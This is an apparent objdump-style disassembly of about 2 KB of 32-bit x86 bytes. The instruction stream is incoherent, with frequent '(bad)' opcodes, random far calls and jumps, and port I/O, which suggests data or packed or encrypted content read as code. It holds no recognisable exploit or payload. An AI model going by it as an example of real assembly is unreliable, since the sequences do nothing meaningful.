  422400:	jno    0x422428
  422402:	(bad)  
  422403:	popa   
  422404:	and    eax,esp
  422406:	sbb    DWORD PTR [ebp+edx*2+0x42baf3d1],ebx
  42240d:	mov    WORD PTR [edi+ebp*4],ss
  422410:	add    dl,BYTE PTR [ecx]
  422412:	(bad)  
  422413:	aam    0x2f
  422415:	mov    bl,BYTE PTR [ecx]
  422417:	popa   
  422418:	xlat   BYTE PTR ds:[ebx]
  422419:	test   al,0xd1
  42241b:	sahf   
  42241c:	ins    BYTE PTR es:[edi],dx
  42241d:	fild   WORD PTR [edx-0x21]
  422420:	pop    edx
  422421:	pop    ss
  422422:	adc    eax,ecx
  422424:	add    ecx,esp
  422426:	rol    DWORD PTR [edx],0xd3
  422429:	sub    al,0xad
  42242b:	scas   eax,DWORD PTR es:[edi]
  42242c:	push   0xffffff84
  42242e:	inc    edx
  42242f:	add    cl,cl
  422431:	pop    esi
  422432:	imul   ecx,DWORD PTR [edi+0x10d8c9e],0x139f92d4
  42243c:	je     0x4223e3
  42243e:	jle    0x4224be
  422440:	push   cs
  422441:	loope  0x4224a6
  422443:	push   es
  422444:	cli    
  422445:	mov    bh,0x95
  422447:	ret    0xee83
  42244a:	adc    al,0x40
  42244c:	cli    
  42244d:	sbb    BYTE PTR [eax*4+0x502af67b],ah
  422454:	sbb    cl,BYTE PTR [ebx-0x1454dfee]
  42245a:	inc    esi
  42245b:	pop    ecx
  42245c:	fwait
  42245d:	mov    bh,0xe4
  42245f:	jbe    0x4224c1
  422461:	jne    0x42241a
  422463:	fistp  QWORD PTR [eax+0x51]
  422466:	les    esp,FWORD PTR [ebp+0x56]
  422469:	and    esp,edi
  42246b:	test   al,0xc6
  42246d:	pop    ebp
  42246e:	leave  
  42246f:	loopne 0x4224ba
  422471:	pop    ebx
  422472:	adc    al,0x2e
  422474:	jae    0x422446
  422476:	or     ecx,esp
  422478:	lahf   
  422479:	retf   
  42247a:	loope  0x4224f1
  42247c:	pop    ecx
  42247d:	shr    DWORD PTR [eax+0x6a],0xf6
  422481:	imul   ecx,DWORD PTR ds:0x309c1b2d,0xaed5b448
  42248b:	ds out dx,eax
  42248d:	pop    ecx
  42248e:	mov    ah,0x20
  422490:	sbb    bl,cl
  422492:	dec    ebp
  422493:	ficomp DWORD PTR [eax+ebp*4+0x272e5d28]
  42249a:	add    eax,0xfbdf9ec
  42249f:	adc    eax,0x2d16b3e
  4224a4:	lods   al,BYTE PTR ds:[esi]
  4224a5:	jl     0x4224c8
  4224a7:	sbb    eax,0x6435eab2
  4224ac:	adc    bl,al
  4224ae:	sub    al,0x1e
  4224b0:	out    0xd1,al
  4224b2:	adc    al,0x97
  4224b4:	fisubr WORD PTR [edi-0x70ae61bc]
  4224ba:	ins    BYTE PTR es:[edi],dx
  4224bb:	repnz dec ebx
  4224bd:	test   eax,0xbdc24036
  4224c2:	ds push esi
  4224c4:	ja     0x422465
  4224c6:	jecxz  0x42250f
  4224c8:	gs in  eax,dx
  4224ca:	jl     0x422509
  4224cc:	add    bl,BYTE PTR [ebx-0x38f019ff]
  4224d2:	clc    
  4224d3:	cmp    BYTE PTR [ebx+0x3e7907e0],ch
  4224d9:	std    
  4224da:	fldenv [ebp+0x3f1d32f3]
  4224e0:	dec    ecx
  4224e1:	ins    DWORD PTR es:[edi],dx
  4224e2:	and    ecx,DWORD PTR [ebx+0x0]
  4224e5:	call   0xdace:0x9dc3a9b1
  4224ec:	xchg   dl,dl
  4224ee:	cmp    DWORD PTR [esi+0x79],esi
  4224f1:	or     BYTE PTR [eax+0x795cc323],ch
  4224f7:	pop    esp
  4224f8:	jmp    esp
  4224fa:	fwait
  4224fb:	dec    ecx
  4224fc:	mov    WORD PTR [edi],?
  4224fe:	jb     0x4224af
  422500:	out    dx,eax
  422501:	jp     0x42251f
  422503:	jl     0x4224cf
  422505:	fwait
  422506:	mov    cl,0xb
  422508:	scas   eax,DWORD PTR es:[edi]
  422509:	xchg   esp,eax
  42250a:	popa   
  42250b:	dec    edi
  42250c:	in     al,0x95
  42250e:	daa    
  42250f:	xchg   DWORD PTR [ebx-0x68798ab4],ebx
  422515:	call   0xb8e6:0xe04e8f78
  42251c:	ds add al,0x43
  42251f:	(bad)  
  422520:	ins    DWORD PTR es:[edi],dx
  422521:	daa    
  422522:	cmp    al,0xd6
  422524:	add    ebx,DWORD PTR [ecx]
  422526:	ss push 0x36
  422529:	jmp    0x422569
  42252b:	and    BYTE PTR [ebx+0x4e],dh
  42252e:	push   cs
  42252f:	retf   
  422530:	aad    0x52
  422532:	sub    edx,DWORD PTR [eax-0x64]
  422535:	add    eax,0x8490bb3b
  42253a:	retf   0x76e8
  42253d:	ret    
  42253e:	iret   
  42253f:	sbb    DWORD PTR [esi],edi
  422541:	push   ss
  422542:	pop    eax
  422543:	cmp    ch,BYTE PTR [ecx]
  422545:	inc    esp
  422546:	stos   DWORD PTR es:[edi],eax
  422547:	xor    esi,DWORD PTR ds:0xd037ecd5
  42254d:	nop
  42254e:	rol    DWORD PTR [ebp+0x58],1
  422551:	mov    ah,0x70
  422553:	lahf   
  422554:	rcl    DWORD PTR [ecx+0x4c],cl
  422557:	addr16 mov bl,0xb9
  42255a:	sti    
  42255b:	xchg   ecx,eax
  42255c:	dec    edi
  42255d:	xor    esi,edx
  42255f:	(bad)  
  422560:	fisttp QWORD PTR [ebp+ebx*1+0x7e]
  422564:	outs   dx,DWORD PTR ds:[esi]
  422565:	mov    WORD PTR [edx-0x2cff7b73],ds
  42256b:	mov    bl,BYTE PTR [ecx+0x1b6e71a3]
  422571:	loopne 0x422569
  422573:	xchg   ebx,eax
  422574:	pop    eax
  422575:	push   esi
  422576:	add    al,BYTE PTR [esi+esi*2]
  422579:	adc    eax,0xb8cd50d3
  42257e:	ret    
  42257f:	cmp    eax,0xeca035be
  422584:	sub    BYTE PTR [ecx-0x994d7b2],al
  42258a:	push   esp
  42258b:	inc    ebx
  42258c:	scas   al,BYTE PTR es:[edi]
  42258d:	xchg   edx,eax
  42258e:	push   esp
  42258f:	dec    esi
  422590:	lods   eax,DWORD PTR ds:[esi]
  422591:	inc    ebx
  422592:	sbb    al,0xbf
  422594:	clc    
  422595:	ins    DWORD PTR es:[edi],dx
  422596:	fcom   QWORD PTR [eax+0x56]
  422599:	dec    di
  42259b:	neg    DWORD PTR [edi-0x34]
  42259e:	clc    
  42259f:	add    BYTE PTR [ebp+0x61d2897f],ch
  4225a5:	imul   cx,cx,0x4
  4225a9:	ret    0x4fda
  4225ac:	xchg   ebp,eax
  4225ad:	ja     0x422595
  4225af:	in     eax,dx
  4225b0:	inc    ecx
  4225b1:	in     al,dx
  4225b2:	inc    ecx
  4225b3:	mov    ebx,ecx
  4225b5:	stos   DWORD PTR es:[edi],eax
  4225b6:	cmp    eax,0x4f3a7992
  4225bb:	test   ecx,esp
  4225bd:	or     eax,DWORD PTR [eax+0x6d]
  4225c0:	div    DWORD PTR [esi+0x7f72318c]
  4225c6:	cld    
  4225c7:	mov    ebp,0x8c6e2d98
  4225cc:	call   0x2bed286c
  4225d1:	jge    0x42262d
  4225d3:	js     0x42255e
  4225d5:	mov    ah,BYTE PTR [edi+0x74cb845e]
  4225db:	dec    edi
  4225dc:	sub    esi,DWORD PTR [edi-0x29b61c69]
  4225e2:	inc    edi
  4225e3:	loop   0x4225b8
  4225e5:	cdq    
  4225e6:	jle    0x422650
  4225e8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4225ea:	jge    0x42265e
  4225ec:	test   BYTE PTR [esp+ebp*2],ch
  4225ef:	adc    dl,BYTE PTR [esi+edi*2+0x2cd746c9]
  4225f6:	adc    BYTE PTR [ebp+0x7221319b],0x52
  4225fd:	adc    eax,0x58bc48b4
  422602:	ret    
  422603:	sbb    BYTE PTR [edi],bh
  422605:	push   eax
  422606:	pop    edx
  422607:	in     al,0x58
  422609:	hlt    
  42260a:	mov    ds:0x9d43bba,eax
  42260f:	and    BYTE PTR [eax-0x55],cl
  422612:	xchg   edx,eax
  422613:	(bad)
  422616:	mov    esp,0x929c5a7
  42261b:	cmp    ah,bh
  42261d:	ds sbb eax,edi
  422620:	inc    eax
  422621:	sahf   
  422622:	push   ss
  422623:	lds    edi,FWORD PTR [ebx]
  422625:	push   cs
  422626:	retf   0xccf5
  422629:	adc    DWORD PTR [ebx+ecx*4],ecx
  42262c:	pop    edx
  42262d:	jmp    0xdae857b3
  422632:	jecxz  0x4226a6
  422634:	ds mov ecx,eax
  422637:	mov    al,0x2
  422639:	sub    ebx,esi
  42263b:	sub    edx,DWORD PTR [edx-0x5f825754]
  422641:	xlat   BYTE PTR ds:[ebx]
  422642:	sbb    ebx,DWORD PTR [edx-0x44769fbd]
  422648:	mov    ds:0xb257592,al
  42264d:	inc    ebx
  42264e:	mov    dl,0xbc
  422650:	stc    
  422651:	test   al,0x62
  422653:	cli    
  422654:	sbb    DWORD PTR [ebx-0x7b48d26e],eax
  42265a:	into   
  42265b:	sub    bl,0x8f
  42265e:	mov    edi,0xd1d4d82
  422663:	hlt    
  422664:	jne    0x422667
  422666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422667:	js     0x422648
  422669:	jae    0x42269d
  42266b:	cli    
  42266c:	(bad)  
  42266d:	adc    eax,0xcfb691fa
  422672:	pushf  
  422673:	jl     0x422671
  422675:	mov    bh,0xb8
  422677:	mov    ds:0x3fa7db1a,al
  42267c:	fstp   st(4)
  42267e:	jnp    0x4226d5
  422680:	jo     0x422645
  422682:	cwde   
  422683:	xchg   edi,eax
  422684:	xchg   esp,eax
  422685:	dec    edx
  422686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422687:	mov    ecx,0x6ca5283d
  42268c:	retf   
  42268d:	stc    
  42268e:	and    al,BYTE PTR [esi-0x612c1899]
  422694:	add    eax,0xa45de41c
  422699:	push   edx
  42269a:	pop    esi
  42269b:	out    0xaf,al
  42269d:	jp     0x4226c6
  42269f:	inc    ebx
  4226a0:	bound  esp,QWORD PTR [edx]
  4226a2:	pop    ecx
  4226a3:	lods   eax,DWORD PTR ds:[esi]
  4226a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226a5:	pop    edx
  4226a6:	adc    al,0x33
  4226a8:	xor    edx,0x44c1f6ec
  4226ae:	or     dl,BYTE PTR [edi+0x39]
  4226b1:	retf   0xe132
  4226b4:	xor    DWORD PTR ds:0x65a23faf,edx
  4226ba:	gs stos BYTE PTR es:[edi],al
  4226bc:	add    al,0xad
  4226be:	rol    BYTE PTR [esi],0x16
  4226c1:	mov    eax,0x60ce9e4b
  4226c6:	or     al,ch
  4226c8:	xchg   esi,eax
  4226c9:	xchg   ecx,eax
  4226ca:	fwait
  4226cb:	rol    BYTE PTR [ebx],0x27
  4226ce:	inc    edx
  4226cf:	loopne 0x422694
  4226d1:	stos   DWORD PTR es:[edi],eax
  4226d2:	push   eax
  4226d3:	es loopne 0x4226b2
  4226d6:	jecxz  0x4226e6
  4226d8:	jge    0x4226c7
  4226da:	mov    BYTE PTR [edx-0x2b],0x7
  4226de:	cmc    
  4226df:	cmp    ah,dl
  4226e1:	test   al,0xd4
  4226e3:	add    DWORD PTR [edi],ecx
  4226e5:	sub    esi,DWORD PTR [ecx-0x5]
  4226e8:	(bad)  
  4226e9:	(bad)  
  4226ea:	fbstp  TBYTE PTR [esi+0x71]
  4226ed:	fstp   TBYTE PTR [ebp-0x39]
  4226f0:	pop    ebp
  4226f1:	cwde   
  4226f2:	(bad)  
  4226f3:	ss (bad) 
  4226f5:	ret    0x40d5
  4226f8:	shl    DWORD PTR [edx],0x2e
  4226fb:	repz (bad) 
  4226fd:	popf   
  4226fe:	mov    BYTE PTR [eax+0x52d7a000],cl
  422704:	mov    al,ds:0x60902d19
  422709:	sbb    BYTE PTR [eax-0x75],0x63
  42270d:	push   edi
  42270e:	push   esp
  42270f:	ins    DWORD PTR es:[edi],dx
  422710:	cmp    al,BYTE PTR [esi-0x114385c0]
  422716:	stos   BYTE PTR es:[edi],al
  422717:	ins    BYTE PTR es:[edi],dx
  422718:	mov    al,ds:0x1fd69577
  42271d:	ret    0xbf28
  422720:	and    al,0xa1
  422722:	daa    
  422723:	cli    
  422724:	add    eax,0x7a6dd99c
  422729:	sbb    al,0xad
  42272b:	jmp    0x94e472e0
  422730:	sub    DWORD PTR [esi+eiz*8],esp
  422733:	std    
  422734:	daa    
  422735:	push   0x1e
  422737:	sub    DWORD PTR [ebx+0x43],esp
  42273a:	xchg   edx,eax
  42273b:	test   DWORD PTR [edi],edx
  42273d:	sub    DWORD PTR [edx+0x61],edi
  422740:	outs   dx,BYTE PTR ds:[esi]
  422741:	jmp    0x4227a5
  422743:	nop
  422744:	dec    esi
  422745:	pop    ebp
  422746:	fs xchg esp,eax
  422748:	or     DWORD PTR [eax-0x40],0x5e6875ae
  42274f:	mov    esp,DWORD PTR [ecx+0x4bfdde92]
  422755:	adc    al,0x6c
  422757:	push   ecx
  422758:	sahf   
  422759:	loope  0x42273d
  42275b:	out    dx,al
  42275c:	mov    BYTE PTR [ecx+0x82f474f],bl
  422762:	adc    BYTE PTR [edi+edi*4+0x37ba1903],bl
  422769:	lods   al,BYTE PTR ds:[esi]
  42276a:	xlat   BYTE PTR ds:[ebx]
  42276b:	call   0xbb43:0x685f9e83
  422772:	mov    dh,0x1d
  422774:	(bad)  
  422775:	or     al,BYTE PTR [edi]
  422777:	sbb    esi,DWORD PTR [edx+0x6c]
  42277a:	push   edi
  42277b:	mov    bl,0x8
  42277d:	shl    DWORD PTR [ebx-0x6f],1
  422780:	ja     0x422733
  422782:	sar    BYTE PTR [esi-0xd],cl
  422785:	arpl   WORD PTR [eax-0x7c],sp
  422788:	jo     0x422755
  42278a:	call   0x1a88:0x9094439a
  422791:	arpl   WORD PTR cs:[edx],si
  422794:	mov    esp,0xf56783d2
  422799:	pop    esp
  42279a:	sub    bh,BYTE PTR [ebp-0x49cbadfa]
  4227a0:	mov    ebx,DWORD PTR [edi+0x67d4284d]
  4227a6:	hlt    
  4227a7:	or     eax,0x33b6d1fe
  4227ac:	jge    0x422732
  4227ae:	in     eax,0x33
  4227b0:	adc    eax,0x67d63d79
  4227b5:	mov    esp,0x13f9cd39
  4227ba:	push   es
  4227bb:	xor    BYTE PTR [edx-0x52701163],dl
  4227c1:	add    DWORD PTR [ebx+eiz*8],ebx
  4227c4:	cmp    DWORD PTR [ebx-0x13],esp
  4227c7:	and    al,0x3
  4227c9:	mov    eax,ds:0xa1bd07a0
  4227ce:	sahf   
  4227cf:	or     bl,BYTE PTR [ebx+0x5f08fc32]
  4227d5:	in     eax,dx
  4227d6:	dec    edx
  4227d7:	adc    al,0x90
  4227d9:	xchg   ecx,eax
  4227da:	jb     0x422820
  4227dc:	imul   ecx,DWORD PTR [edi],0x4c
  4227df:	pop    es
  4227e0:	fld    DWORD PTR [edx-0x2d0ac0f4]
  4227e6:	xchg   edx,eax
  4227e7:	loopne 0x42284c
  4227e9:	(bad)  
  4227ea:	jo     0x422815
  4227ec:	neg    DWORD PTR [ecx+0x3eecb066]
  4227f2:	ds mov ecx,0xb290ba7e
  4227f8:	outs   dx,DWORD PTR ds:[esi]
  4227f9:	les    esp,FWORD PTR [ebx+ecx*8]
  4227fc:	adc    bh,BYTE PTR [edx-0x18f166b]
  422802:	sub    BYTE PTR [edx-0x7780370a],ch
  422808:	popf   
  422809:	push   0x79e7cf36
  42280e:	jo     0x4227a0
  422810:	xor    edx,ecx
  422812:	push   edx
  422813:	lods   eax,DWORD PTR ds:[esi]
  422814:	xchg   esp,eax
  422815:	adc    BYTE PTR [edi-0x60],cl
  422818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422819:	jns    0x422886
  42281b:	inc    esi
  42281c:	shr    BYTE PTR [ecx],0x15
  42281f:	xlat   BYTE PTR ds:[ebx]
  422820:	and    dl,BYTE PTR [edx+0x689f5a7a]
  422826:	jne    0x4227dd
  422828:	shl    BYTE PTR [esi],cl
  42282a:	imul   esp,DWORD PTR [ecx-0x45],0x8ba943c8
  422831:	inc    ecx
  422832:	daa    
  422833:	xor    DWORD PTR [ebp-0x73],esi
  422836:	mov    esp,0xb2549464
  42283b:	add    dh,BYTE PTR [edx+0xb]
  42283e:	cs xchg ebp,eax
  422840:	dec    eax
  422841:	jno    0x4227ee
  422843:	dec    eax
  422844:	push   ebx
  422845:	pop    edi
  422846:	xchg   edx,eax
  422847:	jmp    0x42282d
  422849:	pop    ebp
  42284a:	daa    
  42284b:	out    dx,al
  42284c:	adc    eax,0x917d1ffa
  422851:	ins    BYTE PTR es:[edi],dx
  422852:	mov    edi,DWORD PTR [ebx]
  422854:	test   BYTE PTR [esi+0x4d3989fe],ch
  42285a:	ror    esi,cl
  42285c:	mov    ?,WORD PTR [ecx+0x6b3efceb]
  422862:	push   esi
  422863:	add    cl,dl
  422865:	cld    
  422866:	push   edx
  422867:	in     eax,0x45
  422869:	xor    ebp,edi
  42286b:	out    0xd8,eax
  42286d:	ins    BYTE PTR es:[edi],dx
  42286e:	clc    
  42286f:	or     ebx,DWORD PTR [esi-0x2d]
  422872:	mov    edx,0xfa8a05d7
  422877:	sub    edi,DWORD PTR [edi]
  422879:	rcr    BYTE PTR [edi],1
  42287b:	js     0x422807
  42287d:	pop    ds
  42287e:	add    BYTE PTR [eax],dl
  422880:	pop    es
  422881:	(bad)  
  422882:	adc    DWORD PTR [eax],ebp
  422884:	or     al,0x49
  422886:	ret    
  422887:	out    0x7a,eax
  422889:	gs mov ebp,ebx
  42288c:	adc    BYTE PTR [ebx],dl
  42288e:	sbb    al,0x37
  422890:	or     ebp,ebx
  422892:	jmp    0x422861
  422894:	mov    WORD PTR [ebp+0x32],?
  422897:	cdq    
  422898:	mov    DWORD PTR [ebx-0x6c564bfe],esi
  42289e:	lods   al,BYTE PTR ds:[esi]
  42289f:	dec    edi
  4228a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228a1:	sub    al,0x8a
  4228a3:	jmp    0xd78425c3
  4228a8:	adc    DWORD PTR [edx-0x4a],edi
  4228ab:	dec    edx
  4228ac:	xor    al,0xe
  4228ae:	shl    BYTE PTR [ebp+0x44],0x52
  4228b2:	and    eax,0x87ebad9a
  4228b7:	mov    ecx,0x476c34da
  4228bc:	and    BYTE PTR [ebx+0x6f],cl
  4228bf:	mov    bh,0x1e
  4228c1:	jae    0x422930
  4228c3:	mov    eax,0x438cac7
  4228c8:	cmp    DWORD PTR [edi],0x73043ad5
  4228ce:	sub    eax,0x2600393a
  4228d3:	or     al,0xc
  4228d5:	daa    
  4228d6:	add    DWORD PTR [esi-0x7],esi
  4228d9:	jno    0x4228f4
  4228db:	pop    edx
  4228dc:	mov    edx,0xa4b61e09
  4228e1:	mov    dh,0x78
  4228e3:	test   eax,0x647ae412
  4228e8:	(bad)  
  4228e9:	mov    WORD PTR [ebp+0xbabd807],es
  4228ef:	cmp    DWORD PTR [edx-0x50],esp
  4228f2:	(bad)  
  4228f3:	jns    0x4228e9
  4228f5:	out    0xa1,al
  4228f7:	pop    esp
  4228f8:	div    DWORD PTR [ecx-0x41]
  4228fb:	mov    ch,0xfa
  4228fd:	sbb    ebx,DWORD PTR [ebx+0xabc9aae]
  422903:	aaa    
  422904:	lods   eax,DWORD PTR ds:[esi]
  422905:	add    bh,BYTE PTR [ecx-0x62]
  422908:	mov    al,ds:0x86f3f80d
  42290d:	mov    ebx,0xbe338622
  422912:	pop    ds
  422913:	stos   DWORD PTR es:[edi],eax
  422914:	jne    0x4228ca
  422916:	fwait
  422917:	xchg   ecx,eax
  422918:	mov    edx,0x1f075c75
  42291d:	icebp  
  42291e:	jo     0x422909
  422920:	and    ah,BYTE PTR [ebp+edx*1-0x21]
  422924:	(bad)  
  422925:	data16 sbb BYTE PTR [edi+0x66],dh
  422929:	gs dec edx
  42292b:	push   ss
  42292c:	std    
  42292d:	xor    edi,DWORD PTR [eax-0x78e1036b]
  422933:	push   edx
  422934:	ss (bad) 
  422936:	add    al,0x17
  422938:	pop    eax
  422939:	stos   DWORD PTR es:[edi],eax
  42293a:	sbb    DWORD PTR [ebp-0x4c],edi
  42293d:	arpl   cx,cx
  42293f:	inc    eax
  422940:	loope  0x422961
  422942:	stos   DWORD PTR es:[edi],eax
  422943:	das    
  422944:	dec    esi
  422945:	shl    BYTE PTR [edx+0x521e6ae5],1
  42294b:	mov    BYTE PTR [ebp-0x6233d551],al
  422951:	mov    al,ds:0xdd31a940
  422956:	jg     0x4228d9
  422958:	test   DWORD PTR [edi-0x2c],edx
  42295b:	and    eax,0x2183f02d
  422960:	test   DWORD PTR [ecx],esi
  422962:	inc    edi
  422963:	mov    WORD PTR [eax-0x47ac8278],gs
  422969:	mov    edx,0xa89e933f
  42296e:	sahf   
  42296f:	push   edx
  422970:	std    
  422971:	mov    ss,WORD PTR [ebp-0x4c090f16]
  422977:	sbb    dh,bl
  422979:	stos   BYTE PTR es:[edi],al
  42297a:	popfw  
  42297c:	or     ebx,DWORD PTR [esi-0x7f2ee52d]
  422982:	mov    al,0xf1
  422984:	(bad)  
  422985:	push   ds
  422986:	pop    ebp
  422987:	pop    es
  422988:	retf   
  422989:	adc    eax,0x99adc84d
  42298e:	fild   WORD PTR [ebx-0x78cab633]
  422994:	pop    esi
  422995:	out    0x65,al
  422997:	mov    cl,ch
  422999:	es dec ebp
  42299b:	and    al,0xfc
  42299d:	jo     0x4229d2
  42299f:	xor    esi,DWORD PTR [ecx]
  4229a1:	lahf   
  4229a2:	mov    BYTE PTR [edi-0x682b31cc],dh
  4229a8:	out    0xf,al
  4229aa:	dec    ecx
  4229ab:	mov    bh,0xd3
  4229ad:	sbb    al,0x59
  4229af:	leave  
  4229b0:	(bad)  
  4229b1:	std    
  4229b2:	jmp    0xc24594a3
  4229b7:	pop    ss
  4229b8:	or     BYTE PTR [esi-0x54],bh
  4229bb:	pop    eax
  4229bc:	rcr    BYTE PTR [bp+si-0x17],1
  4229c0:	adc    dl,al
  4229c2:	add    DWORD PTR [edx],ebp
  4229c4:	stc    
  4229c5:	sbb    BYTE PTR [ebx],0x12
  4229c8:	into   
  4229c9:	fisttp DWORD PTR [eax+0x13e5b323]
  4229cf:	mov    al,0xb0
  4229d1:	call   FWORD PTR [edi+eiz*1]
  4229d4:	out    dx,al
  4229d5:	pop    ebp
  4229d6:	inc    si
  4229d8:	inc    esp
  4229d9:	das    
  4229da:	add    al,0xac
  4229dc:	add    DWORD PTR [edx-0x4574b460],edx
  4229e2:	pop    ds
  4229e3:	add    DWORD PTR [eax-0x32],ebp
  4229e6:	mov    bl,0xf
  4229e8:	add    bh,bl
  4229ea:	mov    gs,eax
  4229ec:	hlt    
  4229ed:	mov    DWORD PTR [esi+0x63],ebp
  4229f0:	jo     0x422a34
  4229f2:	xchg   esi,eax
  4229f3:	dec    esi
  4229f4:	sub    ch,0xb1
  4229f7:	arpl   WORD PTR [edx+eax*8],ax
  4229fa:	test   BYTE PTR [ebp+0x48],ch
  4229fd:	or     esi,DWORD PTR [ebx+0x4e]
  422a00:	rol    BYTE PTR [esi+0x5285729b],cl
  422a06:	icebp  
  422a07:	mov    esi,0x55407f31
  422a0c:	das    
  422a0d:	in     al,dx
  422a0e:	(bad)  
  422a10:	xchg   ebp,eax
  422a11:	jecxz  0x422a74
  422a13:	and    eax,0x213ec55b
  422a18:	xlat   BYTE PTR ds:[ebx]
  422a19:	and    eax,DWORD PTR [esi+0x14]
  422a1c:	adc    eax,eax
  422a1e:	daa    
  422a1f:	or     edi,eax
  422a21:	mov    ecx,fs
  422a23:	pop    esp
  422a24:	fldenv [edi-0x46]
  422a27:	sbb    al,0x10
  422a29:	sbb    al,0xb0
  422a2b:	sub    al,0x66
  422a2d:	icebp  
  422a2e:	push   ecx
  422a2f:	adc    BYTE PTR [edx-0x5e],dl
  422a32:	jmp    0x1f00bd09
  422a37:	fst    DWORD PTR [ebp-0x4a]
  422a3a:	push   eax
  422a3b:	pop    ebp
  422a3c:	mov    ah,0x6d
  422a3e:	xor    al,0xab
  422a40:	mov    bl,0x18
  422a42:	jp     0x422a63
  422a44:	or     dl,dl
  422a46:	jne    0x422aa5
  422a48:	outs   dx,DWORD PTR ds:[esi]
  422a49:	adc    ch,bl
  422a4b:	dec    ecx
  422a4c:	fnstenv [edx+0x6c]
  422a4f:	call   0xcbb9:0x2a4673a4
  422a56:	inc    ebx
  422a57:	clc    
  422a58:	inc    ebx
  422a59:	popa   
  422a5a:	or     bl,BYTE PTR [edi-0x40b7c48]
  422a60:	jecxz  0x4229f5
  422a62:	enter  0x2c1e,0xdc
  422a66:	sbb    DWORD PTR [ebp-0x47],edi
  422a69:	out    0xdd,al
  422a6b:	cmp    DWORD PTR [eax+0x5af512a3],ebx
  422a71:	imul   edx,DWORD PTR [edi],0xddac95b4
  422a77:	xor    al,0x54
  422a79:	mov    eax,ds:0xe4d2cd50
  422a7e:	retf   0xb91c
  422a81:	ja     0x422ad3
  422a83:	lods   eax,DWORD PTR ds:[esi]
  422a84:	add    eax,0x7cfdec46
  422a89:	or     DWORD PTR [edx-0x24],0x22
  422a8d:	jg     0x422aa9
  422a8f:	mov    edx,0xd5fb726d
  422a94:	and    cl,al
  422a96:	add    DWORD PTR [esi+esi*2+0x2032a94c],0x3d
  422a9e:	jg     0x422af8
  422aa0:	in     eax,0xe8
  422aa2:	pop    esp
  422aa3:	nop
  422aa4:	add    eax,0x54448e60
  422aa9:	into   
  422aaa:	(bad)  
  422aac:	push   ds
  422aad:	mov    bl,0x9b
  422aaf:	ss loope 0x422a9c
  422ab2:	mov    dh,bh
  422ab4:	mov    esi,0x44562f72
  422ab9:	push   edi
  422aba:	inc    eax
  422abb:	xabort 0xed
  422abe:	push   esi
  422abf:	or     BYTE PTR [edi-0x79],bl
  422ac2:	push   cs
  422ac3:	and    DWORD PTR [ecx-0x35],esi
  422ac6:	xchg   DWORD PTR [edi],eax
  422ac8:	fwait
  422ac9:	mov    bh,0xe9
  422acb:	sbb    eax,0xd04991f3
  422ad0:	xchg   esi,eax
  422ad1:	loop   0x422aa1
  422ad3:	sbb    eax,0x8b753d60
  422ad8:	shr    BYTE PTR [edx],0x16
  422adb:	cmp    BYTE PTR [edi+edi*1],0x4a
  422adf:	fs jns 0xb08d0b6d
  422ae6:	or     eax,edi
  422ae8:	pop    edi
  422ae9:	out    0xab,eax
  422aeb:	ss imul edx,ecx,0x39
  422aef:	pop    ss
  422af0:	sub    BYTE PTR [esi-0x2c],al
  422af3:	dec    ebp
  422af4:	dec    eax
  422af5:	sar    DWORD PTR [esi],1
  422af7:	aam    0x34
  422af9:	ret    
  422afa:	cdq    
  422afb:	jns    0x422b27
  422afd:	cmp    esp,DWORD PTR [esi]
  422aff:	mov    bh,0x5
  422b01:	mov    dl,0xd5
  422b03:	lahf   
  422b04:	mov    DWORD PTR [edi-0x20b15158],esi
  422b0a:	pusha  
  422b0b:	inc    ebp
  422b0c:	xor    eax,0x1798d77c
  422b11:	xor    DWORD PTR [eax+0x3b6927c6],ecx
  422b17:	pop    ss
  422b18:	ret    
  422b19:	inc    esp
  422b1a:	push   es
  422b1b:	es stos BYTE PTR es:[edi],al
  422b1d:	in     al,dx
  422b1e:	repz fst DWORD PTR [eax-0x5274147c]
  422b25:	sub    edx,0xcb0f1568
  422b2b:	ins    BYTE PTR es:[edi],dx
  422b2c:	sti    
  422b2d:	repnz lds ebp,FWORD PTR [ebx+eiz*1-0x4e]
  422b32:	add    eax,0x6343c0de
  422b37:	scas   eax,DWORD PTR es:[edi]
  422b38:	mov    DWORD PTR [ebp+ecx*1+0x77],ebx
  422b3c:	fstp   TBYTE PTR [ebx]
  422b3e:	xchg   edx,ecx
  422b40:	leave  
  422b41:	stos   BYTE PTR es:[edi],al
  422b42:	ret    0x8a6c
  422b45:	mov    bl,0xe
  422b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b48:	jmp    0xb156f6be
  422b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b4e:	stos   BYTE PTR es:[edi],al
  422b4f:	dec    esp
  422b50:	outs   dx,BYTE PTR ds:[esi]
  422b51:	mov    bl,0x47
  422b53:	jg     0x422b94
  422b55:	(bad)  
  422b56:	(bad)  
  422b58:	sbb    al,0x99
  422b5a:	fst    QWORD PTR [edi+0x5c24fd2d]
  422b60:	xor    BYTE PTR [edx],0x19
  422b63:	das    
  422b64:	add    BYTE PTR [edx+0x10],dh
  422b67:	fsub   QWORD PTR [edx-0xb]
  422b6a:	and    al,0x6
  422b6c:	int    0x5c
  422b6e:	push   ecx
  422b6f:	mov    cs,WORD PTR [edx+0x46]
  422b72:	mov    edx,0xf8959dbc
  422b77:	int    0xd0
  422b79:	mov    cl,0xf6
  422b7b:	test   al,0x29
  422b7d:	xchg   ebx,eax
  422b7e:	fdivr  QWORD PTR [ebx+esi*2-0x52]
  422b82:	xor    eax,DWORD PTR [ecx+0x301f3f1f]
  422b88:	daa    
  422b89:	mov    al,fs:0x71890b75
  422b8f:	rcr    BYTE PTR [eax+esi*8],0x49
  422b93:	sahf   
  422b94:	nop
  422b95:	mov    edi,DWORD PTR [eax-0x406575a8]
  422b9b:	dec    eax
  422b9c:	retf   0xcd00
  422b9f:	sub    al,0x6f
  422ba1:	sar    BYTE PTR [ecx],1
  422ba3:	xchg   edi,eax
  422ba4:	pop    es
  422ba5:	(bad)  
  422ba6:	fsubr  QWORD PTR [ebx]
  422ba8:	push   es
  422ba9:	inc    eax
  422baa:	adc    DWORD PTR [eax-0x65],0x26
  422bae:	fwait
  422baf:	and    ecx,DWORD PTR [edi+0x3e61c7eb]
  422bb5:	add    edx,DWORD PTR [ebx]
